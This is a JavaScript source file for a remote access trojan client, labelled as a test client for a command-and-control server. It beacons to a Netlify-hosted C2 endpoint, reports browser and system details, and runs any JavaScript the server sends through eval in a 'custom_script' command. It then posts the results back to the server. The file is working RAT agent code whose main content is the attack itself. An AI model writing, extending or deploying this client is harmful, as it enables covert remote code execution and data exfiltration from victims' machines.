// Simple Rat Client for testing C2 server
class RatClient {
  constructor(serverUrl, clientId, authToken) {
    this.serverUrl = serverUrl;
    this.clientId = clientId;
    this.authToken = authToken;
    this.heartbeatInterval = null;
  }

  async startHeartbeat(interval = 5000) {
    console.log(`Starting heartbeat for client: ${this.clientId}`);
    
    const heartbeat = async () => {
      try {
        const response = await fetch(`${this.serverUrl}/.netlify/functions/heartbeat`, {
          method: 'GET',
          headers: {
            'X-Client-ID': this.clientId,
            'Authorization': `Bearer ${this.authToken}`
          }
        });

        const data = await response.json();
        
        if (data.status === 'command_pending') {
          console.log('Received command:', data.command);
          await this.executeCommand(data.command);
        } else {
          console.log('Heartbeat acknowledged, next check in', data.next_check, 'ms');
        }
      } catch (error) {
        console.error('Heartbeat error:', error);
      }
    };

    // Start heartbeat
    await heartbeat();
    this.heartbeatInterval = setInterval(heartbeat, interval);
  }

  async executeCommand(commandData) {
    const { command, parameters, id: commandId } = commandData;
    
    console.log(`Executing command: ${command}`);
    
    let result = null;
    let error = null;

    try {
      switch (command) {
        case 'system_info':
          result = {
            platform: navigator.platform,
            userAgent: navigator.userAgent,
            language: navigator.language,
            cookieEnabled: navigator.cookieEnabled,
            onLine: navigator.onLine
          };
          break;

        case 'screenshot':
          // In a real implementation, this would capture a screenshot
          result = { status: 'screenshot_captured', url: 'screenshot.png' };
          break;

        case 'custom_script':
          // Execute custom JavaScript code
          if (parameters && parameters.code) {
            result = eval(parameters.code);
          } else {
            throw new Error('No code provided');
          }
          break;

        case 'ping':
          result = { pong: Date.now() };
          break;

        default:
          throw new Error(`Unknown command: ${command}`);
      }
    } catch (err) {
      error = err.message;
    }

    // Send response back to C2
    await this.sendResponse(commandId, result, error);
  }

  async sendResponse(commandId, result, error) {
    try {
      const response = await fetch(`${this.serverUrl}/.netlify/functions/response`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Client-ID': this.clientId
        },
        body: JSON.stringify({
          clientId: this.clientId,
          commandId: commandId,
          result: result,
          error: error
        })
      });

      const data = await response.json();
      console.log('Response sent:', data);
    } catch (error) {
      console.error('Error sending response:', error);
    }
  }

  stop() {
    if (this.heartbeatInterval) {
      clearInterval(this.heartbeatInterval);
      this.heartbeatInterval = null;
      console.log('Heartbeat stopped');
    }
  }
}

// Example usage (for browser console)
// const client = new RatClient('https://your-site.netlify.app', 'test-client-1', 'your-auth-token');
// client.startHeartbeat();

// Export for Node.js usage
if (typeof module !== 'undefined' && module.exports) {
  module.exports = RatClient;
}
